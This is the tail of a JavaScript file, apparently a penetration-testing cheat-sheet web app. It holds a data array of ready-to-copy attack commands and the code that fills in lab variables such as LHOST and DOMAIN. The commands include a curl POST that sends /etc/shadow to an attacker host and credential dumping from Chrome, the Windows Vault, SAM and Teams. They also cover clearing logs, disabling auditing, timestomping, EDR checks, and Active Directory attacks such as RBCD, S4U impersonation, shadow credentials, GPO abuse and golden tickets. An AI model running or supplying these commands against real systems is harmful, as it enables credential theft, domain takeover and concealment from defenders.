                          "title": "Exfil via HTTP POST",
                          "command": "curl -s -X POST http://{LHOST}/upload -F 'file=@/etc/shadow'",
                          "tags": []
                      },
                      {
                          "title": "Memory dump process",
                          "command": "gcore PID  # dump process memory\nstrings core.PID | grep -i 'pass\\|secret\\|token'",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Windows Loot",
                  "commands": [
                      {
                          "title": "Browser password dump",
                          "command": "# Edge/Chrome:\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\n# Tool: SharpChrome.exe logins",
                          "tags": []
                      },
                      {
                          "title": "Clipboard content",
                          "command": "powershell -c \"Get-Clipboard\"",
                          "tags": []
                      },
                      {
                          "title": "Windows Vault (saved creds)",
                          "command": "vaultcmd /listcreds:\"Windows Credentials\" /all\nvaultcmd /listcreds:\"Web Credentials\" /all",
                          "tags": []
                      },
                      {
                          "title": "RDP saved creds",
                          "command": "cmdkey /list\ndir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ 2>nul",
                          "tags": []
                      },
                      {
                          "title": "Sticky Notes (passwords)",
                          "command": "type C:\\Users\\{USER}\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite 2>nul",
                          "tags": []
                      },
                      {
                          "title": "Teams data",
                          "command": "# %APPDATA%\\Microsoft\\Teams\\Cookies\n# Contains auth tokens",
                          "tags": []
                      },
                      {
                          "title": "Outlook PST / OST",
                          "command": "dir /s C:\\Users\\*.pst C:\\Users\\*.ost 2>nul",
                          "tags": []
                      },
                      {
                          "title": "SAM offline (VSS)",
                          "command": "vssadmin list shadows\nreg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "OPSEC & Cleanup",
                  "commands": [
                      {
                          "title": "Linux - clear bash history",
                          "command": "history -c; cat /dev/null > ~/.bash_history; history -w",
                          "tags": []
                      },
                      {
                          "title": "Linux - clean auth.log",
                          "command": "# Only authorized use - remove your entries:\nsed -i '/YOUR_IP/d' /var/log/auth.log",
                          "tags": []
                      },
                      {
                          "title": "Linux - timestomp (modify timestamps)",
                          "command": "touch -t 202001010000.00 /tmp/evil.sh  # set mtime to 2020-01-01",
                          "tags": []
                      },
                      {
                          "title": "Windows - clear event logs",
                          "command": "wevtutil cl System; wevtutil cl Security; wevtutil cl Application",
                          "tags": []
                      },
                      {
                          "title": "Windows - disable logging",
                          "command": "auditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable",
                          "tags": []
                      },
                      {
                          "title": "Windows - delete artefacts",
                          "command": "del /f /q %TEMP%\\*.exe %USERPROFILE%\\Downloads\\shell.exe 2>nul\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /f 2>nul",
                          "tags": []
                      },
                      {
                          "title": "Shred file (Linux)",
                          "command": "shred -uzn 3 /tmp/evil.sh",
                          "tags": []
                      },
                      {
                          "title": "Check open connections from box",
                          "command": "ss -tulnp\nnetstat -tulnp\n# Look for unexpected outbound connections",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Situational Awareness",
                  "commands": [
                      {
                          "title": "What am I running on?",
                          "command": "uname -a; cat /etc/os-release; hostnamectl",
                          "tags": []
                      },
                      {
                          "title": "Who is logged in?",
                          "command": "who; w; last | head -20",
                          "tags": []
                      },
                      {
                          "title": "AV/EDR check (Linux)",
                          "command": "ps aux | grep -iE 'falcon|crowdstrike|cbdaemon|clamd|eset|sophos'\nfind / -name 'falcon*' -o -name 'cbsensor' 2>/dev/null",
                          "tags": []
                      },
                      {
                          "title": "AV/EDR check (Windows)",
                          "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState\nGet-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled",
                          "tags": []
                      },
                      {
                          "title": "EDR detection (PS Constrained Lang)",
                          "command": "$ExecutionContext.SessionState.LanguageMode  # ConstrainedLanguage = EDR active",
                          "tags": []
                      },
                      {
                          "title": "Check proxy / outbound",
                          "command": "curl -s --max-time 5 http://ifconfig.me  # Are we NATted?\ncurl -x http://proxy.internal:8080 http://ifconfig.me",
                          "tags": []
                      },
                      {
                          "title": "Internal network map",
                          "command": "arp -a\nip neigh\nfor i in $(seq 1 254); do (ping -c1 -W1 192.168.1.$i &>/dev/null && echo 192.168.1.$i up)& done; wait",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "adextra",
          "label": "AD Extra Attacks",
          "group": "Active Directory",
          "groups": [
              {
                  "title": "Constrained Delegation",
                  "commands": [
                      {
                          "title": "Find constrained deleg users",
                          "command": "Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "S4U2Self + S4U2Proxy (Rubeus)",
                          "command": "Rubeus.exe s4u /user:{USER} /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/{RHOST} /altservice:host,rpcss,http /nowrap /ptt",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "getST (impacket)",
                          "command": "impacket-getST -spn cifs/{RHOST} -impersonate administrator {DOMAIN}/{USER}:'{PASS}'\nexport KRB5CCNAME=administrator.ccache",
                          "tags": [
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "Resource-Based Constrained Delegation",
                  "commands": [
                      {
                          "title": "RBCD - check write perms",
                          "command": "Get-DomainComputer TARGET_MACHINE | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl|WriteProperty' }",
                          "tags": []
                      },
                      {
                          "title": "RBCD - add computer account",
                          "command": "New-MachineAccount -MachineAccount ATTACKER_PC -Password $(ConvertTo-SecureString 'P@ss1234' -AsPlainText -Force)",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "RBCD - set msDS-AllowedToActOnBehalfOfOtherIdentity",
                          "command": "$SID = (Get-DomainComputer ATTACKER_PC).objectsid\nGet-DomainComputer TARGET_MACHINE | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=[Convert]::FromBase64String([Convert]::ToBase64String((New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)\").GetSddlForm('All')))}",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "RBCD - getST and use",
                          "command": "impacket-getST -spn cifs/TARGET_MACHINE.{DOMAIN} -impersonate administrator {DOMAIN}/ATTACKER_PC\\$:'P@ss1234'\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass {DOMAIN}/administrator@TARGET_MACHINE.{DOMAIN}",
                          "tags": [
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "Shadow Credentials",
                  "commands": [
                      {
                          "title": "pyWhisker - add shadow cred",
                          "command": "python3 pywhisker.py -d {DOMAIN} -u {USER} -p '{PASS}' --target TARGET_USER --action add",
                          "tags": [
                              "new",
                              "crit"
                          ]
                      },
                      {
                          "title": "Rubeus shadowcred",
                          "command": "Rubeus.exe shadow /target:TARGET_USER /domain:{DOMAIN} /dc:{DC}",
                          "tags": [
                              "new",
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "Group Policy Object Abuse",
                  "commands": [
                      {
                          "title": "Find writeable GPOs",
                          "command": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll|GenericWrite' -and $_.SecurityIdentifier -eq (Get-DomainUser {USER}).objectsid }",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "GPO - add local admin via SharpGPOAbuse",
                          "command": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {USER} --GPOName \"Vulnerable GPO\"",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "GPO - immediate apply",
                          "command": "gpupdate /force  # on target machine",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Trust Attacks",
                  "commands": [
                      {
                          "title": "Enumerate trusts",
                          "command": "Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType\nnltest /domain_trusts",
                          "tags": []
                      },
                      {
                          "title": "Inter-forest - SID history",
                          "command": "# Golden ticket with extra SID (SID history)\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid SRC_SID -domain {DOMAIN} -extra-sid TARGET_SID -duration 3650 Administrator",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "Foreign group membership",
                          "command": "Get-DomainForeignGroupMember -Domain TRUSTED_DOMAIN | select GroupDomain,GroupName,MemberName",
                          "tags": []
                      }
                  ]
              }
          ]
      },
  ];

  var commands = buildCommands(commandSections);

  function slugify(value) {
    return String(value || "")
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-+|-+$/g, "") || "command";
  }

  function buildCommands(sections) {
    var seen = {};
    var next = [];
    sections.forEach(function (section) {
      section.groups.forEach(function (group) {
        group.commands.forEach(function (entry, index) {
          var baseId = [section.id, slugify(group.title), slugify(entry.title)].join("-");
          var id = baseId;
          var counter = 2;
          while (seen[id]) {
            id = baseId + "-" + counter;
            counter += 1;
          }
          seen[id] = true;
          next.push({
            id: id,
            title: group.title + " - " + entry.title,
            category: section.id,
            command: entry.command,
            tags: [group.title].concat(entry.tags || []),
            sourceIndex: index,
          });
        });
      });
    });
    return next;
  }

  function getDefaultVariables() {
    return {
      LHOST: "10.10.14.3",
      RHOST: "10.10.10.5",
      LPORT: "4444",
      RPORT: "80",
      DOMAIN: "lab.local",
      DC: "10.10.10.10",
      USER: "user",
      PASS: "password",
      HASH: "NTLM_HASH",
      URL: "http://10.10.10.5",
    };
  }

  function renderCommand(template, values) {
    var next = Object.assign({}, getDefaultVariables(), values || {});
    return String(template || "").replace(/\{([A-Z]+)\}/g, function (match, key) {
      return Object.prototype.hasOwnProperty.call(next, key) ? next[key] : match;
    });
  }

  function filterCommands(options) {
    var next = Object.assign(
      { category: "all", query: "", commands: commands },
      options || {}
    );
    var query = String(next.query || "").trim().toLowerCase();
    return next.commands.filter(function (command) {
      var matchesCategory =
        next.category === "all" || command.category === next.category;
      var haystack = [command.title, command.command, command.category]
        .concat(command.tags || [])
        .join(" ")
        .toLowerCase();
      return matchesCategory && (!query || haystack.indexOf(query) !== -1);
    });
  }

  function commandCountForCategory(categoryId, commandList) {
    var list = commandList || commands;
    if (categoryId === "all") return list.length;
    return list.filter(function (command) {
      return command.category === categoryId;
    }).length;
  }

  function loadState() {
    var defaults = {
      variables: getDefaultVariables(),
      category: "all",
      query: "",
    };
    if (typeof localStorage === "undefined") return defaults;
    try {
      var stored = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
      var categoryAliases = {
        "linux-privesc": "lpe",
        "windows-privesc": "wpe",
        ad: "adrecon",
        tunneling: "tunnel",
        cracking: "crack",
      };
      if (stored.category && categoryAliases[stored.category]) {
        stored.category = categoryAliases[stored.category];
      }
      if (
        stored.category &&
        !categories.some(function (category) {
          return category.id === stored.category;
        })
      ) {
        stored.category = defaults.category;
      }
      return {
        variables: Object.assign({}, defaults.variables, stored.variables || {}),
        category: stored.category || defaults.category,
        query: stored.query || defaults.query,
      };
    } catch (error) {
      return defaults;
    }
  }

  function saveState(state) {
    if (typeof localStorage === "undefined") return;
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
    } catch (error) {}
  }

  function setText(element, value) {
    if (element) element.textContent = value;
  }

  function copyText(text, statusElement) {
    function done(message) {
      setText(statusElement, message);
      if (statusElement) {
        window.clearTimeout(statusElement._timer);
        statusElement._timer = window.setTimeout(function () {
          setText(statusElement, "");
        }, 1600);
      }
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(
        function () {
          done("Copied");
        },
        function () {
          done("Copy failed");
        }
      );
      return;
    }
    done("Copy unavailable");
  }

  function initApp() {
    var app = document.querySelector("[data-cheatsheet-app]");
    if (!app) return;

    var state = loadState();
    var categoryList = app.querySelector("[data-cs-categories]");
    var variableFields = Array.prototype.slice.call(
      app.querySelectorAll("[data-cs-var]")
    );
    var categoryButtons = [];
    var queryField = app.querySelector("[data-cs-query]");
    var commandsList = app.querySelector("[data-cs-commands]");
    var status = app.querySelector("[data-cs-status]");

    function renderCategoryNav() {
      if (!categoryList) return;
      categoryList.innerHTML = "";
      var activeGroup = "";
      categories.forEach(function (category) {
        if (category.group !== activeGroup && category.group !== "All") {
          activeGroup = category.group;
          var group = document.createElement("div");
          group.className = "cheatsheet-category-group";
          group.textContent = activeGroup;
          categoryList.appendChild(group);
        }
        var button = document.createElement("button");
        button.type = "button";
        button.setAttribute("data-cs-category", category.id);
        button.innerHTML =
          "<span>" +
          category.label +
          "</span><strong>" +
          commandCountForCategory(category.id, commands) +
          "</strong>";
        categoryList.appendChild(button);
      });
      categoryButtons = Array.prototype.slice.call(
        app.querySelectorAll("[data-cs-category]")
      );
      categoryButtons.forEach(function (button) {
        button.addEventListener("click", function () {
          state.category = button.getAttribute("data-cs-category");
          render();
        });
      });
    }

    function syncInputs() {
      variableFields.forEach(function (field) {
        var key = field.getAttribute("data-cs-var");
        field.value = state.variables[key] || "";
      });
      if (queryField) queryField.value = state.query || "";
      categoryButtons.forEach(function (button) {
        var active = button.getAttribute("data-cs-category") === state.category;
        button.classList.toggle("is-active", active);
        button.setAttribute("aria-pressed", active ? "true" : "false");
      });
    }

    function createCommandCard(command) {
      var rendered = renderCommand(command.command, state.variables);
      var card = document.createElement("article");
      card.className = "cheatsheet-command";
      card.innerHTML =
        '<div class="cheatsheet-command-header">' +
        "<h3></h3>" +
        "<div>" +
        '<button type="button" data-action="copy">Copy</button>' +
        "</div>" +
        "</div>" +
        "<pre></pre>" +
        '<p class="cheatsheet-tags"></p>';
      card.querySelector("h3").textContent = command.title;
      card.querySelector("pre").textContent = rendered;
      card.querySelector(".cheatsheet-tags").textContent = (command.tags || [])
        .map(function (tag) {
          return "#" + tag;
        })
        .join(" ");
      card.querySelector("[data-action='copy']").addEventListener("click", function () {
        copyText(rendered, status);
      });
      return card;
    }

    function renderList(container, items, emptyText) {
      if (!container) return;
      container.innerHTML = "";
      if (!items.length) {
        var empty = document.createElement("p");
        empty.className = "cheatsheet-empty";
        empty.textContent = emptyText;
        container.appendChild(empty);
        return;
      }
      items.forEach(function (item) {
        container.appendChild(item);
      });
    }

    function render() {
      syncInputs();
      var filtered = filterCommands({
        category: state.category,
        query: state.query,
        commandSections: commandSections,
    commands: commands,
      });
      renderList(
        commandsList,
        filtered.map(createCommandCard),
        "No commands match this filter."
      );

      saveState(state);
    }

    variableFields.forEach(function (field) {
      field.addEventListener("input", function () {
        state.variables[field.getAttribute("data-cs-var")] = field.value;
        render();
      });
    });

    if (queryField) {
      queryField.addEventListener("input", function () {
        state.query = queryField.value;
        render();
      });
    }

    app.addEventListener("click", function (event) {
      var target = event.target.closest("[data-cs-action]");
      if (!target) return;
      var action = target.getAttribute("data-cs-action");
      if (action === "reset-vars") {
        state.variables = getDefaultVariables();
        render();
      }
    });

    renderCategoryNav();
    render();
  }

  if (typeof document !== "undefined") {
    document.addEventListener("DOMContentLoaded", initApp);
  }

  return {
    variables: variables,
    categories: categories,
    commands: commands,
    getDefaultVariables: getDefaultVariables,
    renderCommand: renderCommand,
    filterCommands: filterCommands,
    commandCountForCategory: commandCountForCategory,
    initApp: initApp,
  };
});
